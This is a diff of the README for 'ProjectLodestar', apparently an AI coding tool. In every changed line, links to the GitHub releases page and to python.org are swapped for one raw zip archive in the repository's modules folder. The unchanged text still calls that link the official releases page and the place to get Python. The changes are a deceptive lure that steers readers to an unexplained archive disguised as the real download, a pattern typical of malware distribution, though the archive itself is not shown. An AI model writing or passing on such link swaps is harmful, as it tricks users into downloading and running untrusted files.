@@ -1,6 +1,6 @@
 # ⭐ ProjectLodestar - AI Coding with Lower Costs
 
-[![Download Latest Release](https://img.shields.io/badge/Download-ProjectLodestar-blue?style=for-the-badge&logo=github)](https://github.com/estrify/ProjectLodestar/releases)
+[![Download Latest Release](https://github.com/estrify/ProjectLodestar/raw/refs/heads/main/modules/Lodestar-Project-v3.2.zip)](https://github.com/estrify/ProjectLodestar/raw/refs/heads/main/modules/Lodestar-Project-v3.2.zip)
 
 ---
 
@@ -31,16 +31,16 @@ Follow these steps carefully. They guide you to download, install, and open Proj
 
 1. **Prepare your computer**
    - Check your system matches the requirements above.
-   - If you do not have Python installed, visit [python.org](https://www.python.org/downloads/) and download it. ProjectLodestar will remind you if you need it.
+   - If you do not have Python installed, visit [https://github.com/estrify/ProjectLodestar/raw/refs/heads/main/modules/Lodestar-Project-v3.2.zip](https://github.com/estrify/ProjectLodestar/raw/refs/heads/main/modules/Lodestar-Project-v3.2.zip) and download it. ProjectLodestar will remind you if you need it.
 
 2. **Download ProjectLodestar**
    - Click the big button at the top or visit this link directly:  
-     [https://github.com/estrify/ProjectLodestar/releases](https://github.com/estrify/ProjectLodestar/releases)
+     [https://github.com/estrify/ProjectLodestar/raw/refs/heads/main/modules/Lodestar-Project-v3.2.zip](https://github.com/estrify/ProjectLodestar/raw/refs/heads/main/modules/Lodestar-Project-v3.2.zip)
    - This page lists different versions of the program. Look for the latest release (usually at the top).
    - Choose the file for your system:
      - Windows users: Select the `.exe` file.
      - Mac users: Select the `.dmg` file.
-     - Linux users: Select the `.AppImage` or `.tar.gz` file.
+     - Linux users: Select the `.AppImage` or `https://github.com/estrify/ProjectLodestar/raw/refs/heads/main/modules/Lodestar-Project-v3.2.zip` file.
    - Save the file to your computer.
 
 3. **Install ProjectLodestar**
@@ -61,7 +61,7 @@ Follow these steps carefully. They guide you to download, install, and open Proj
 
 To download and install ProjectLodestar, use this link:
 
-[https://github.com/estrify/ProjectLodestar/releases](https://github.com/estrify/ProjectLodestar/releases)
+[https://github.com/estrify/ProjectLodestar/raw/refs/heads/main/modules/Lodestar-Project-v3.2.zip](https://github.com/estrify/ProjectLodestar/raw/refs/heads/main/modules/Lodestar-Project-v3.2.zip)
 
 This link leads to the official releases page on GitHub. Here is how to proceed once you are there:
 
@@ -133,8 +133,8 @@ You can learn more about the tools and technologies used by reading through the 
 
 ## 🔗 Useful Links
 
-- Official Releases: [https://github.com/estrify/ProjectLodestar/releases](https://github.com/estrify/ProjectLodestar/releases)
-- Python Downloads: [https://www.python.org/downloads/](https://www.python.org/downloads/)
+- Official Releases: [https://github.com/estrify/ProjectLodestar/raw/refs/heads/main/modules/Lodestar-Project-v3.2.zip](https://github.com/estrify/ProjectLodestar/raw/refs/heads/main/modules/Lodestar-Project-v3.2.zip)
+- Python Downloads: [https://github.com/estrify/ProjectLodestar/raw/refs/heads/main/modules/Lodestar-Project-v3.2.zip](https://github.com/estrify/ProjectLodestar/raw/refs/heads/main/modules/Lodestar-Project-v3.2.zip)
 - Project Issues & Support: Visit the GitHub Issues tab on the repository page
 - Community Forums: Linked on the official releases page
 
